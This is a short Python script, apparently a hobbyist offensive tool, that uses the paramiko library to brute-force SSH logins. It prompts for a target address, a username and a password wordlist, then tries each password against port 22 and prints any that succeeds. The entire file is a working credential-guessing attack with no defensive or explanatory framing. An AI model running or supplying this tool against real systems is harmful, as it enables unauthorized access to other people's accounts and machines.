import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    # Standard lines of code used to connect
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try: # specifies the connection information and will leave code = 0 if successful
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException: # if we connect and password is incorrect, sets code = 1
        code = 1
    except socket.error as e: # if there is a connection issue such as machine is off, sets code  = 2
        code = 2
    ssh.close()
    return code

# Asks user for input variables and file paths
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

# Gives us an error message if the file path is incorrect
if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

# Opens our password file
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip('\n')
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: {} , For Account: {}'.format(password, username)), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: {}'.format(password))
            elif response == 2:
                print('[!!] Connection Error ')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
